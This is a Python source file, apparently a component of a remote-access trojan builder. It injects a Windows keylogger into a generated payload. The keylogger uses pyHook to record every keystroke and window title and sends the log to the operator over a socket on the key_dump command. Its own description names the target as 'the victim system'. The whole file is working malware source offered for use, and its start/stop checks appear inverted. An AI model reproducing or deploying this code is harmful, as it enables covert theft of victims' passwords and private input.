# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyHook')
        config.import_statements.append('import pythoncom')
        config.import_statements.append('import threading')
        config.import_statements.append('from ctypes import windll')
        config.global_vars.append('keylog = ""')
        config.global_vars.append('window = ""')
        config.global_vars.append('active = False')
        config.functions.append('''
def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\\n\\n<User started typing in new window : ' + event.WindowName + '>\\n\\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active
    global keylog
    if option == 'key_start':
        if not active:
            s.sendall('[-]Keylogger already started')
        else:
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            active = not active
            s.sendall('[+]Activated keylogger')
            while True:
                if active:
                    hooks_manager.UnhookKeyboard()
                    windll.user32.PostQuitMessage(0)
                    return
                else:
                    pythoncom.PumpWaitingMessages()
    elif option == 'key_stop':
        if not active:
            s.sendall('[-]Keylogger not started')
        else:
            active = not active
            s.sendall('[+]Stopped keylogger')
    elif option == 'key_dump':
        s.sendall('[+]Keylog dump : \\n' + keylog + '\\n')
        keylog = ''
''')
        config.logics.append('''
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()''')
    elif option == 'info':
        print '\nName             : Keylogger component' \
              '\nOS               : Windows' \
              '\nRequired Modules : PyHook (External), pythoncom (External), threading, ctypes' \
              '\nCommands         : key_start, key_stop, key_dump' \
              '\nDescription      : Runs a keylogger on the victim system which logs in-memory, to view the log run the key_dump command\n'
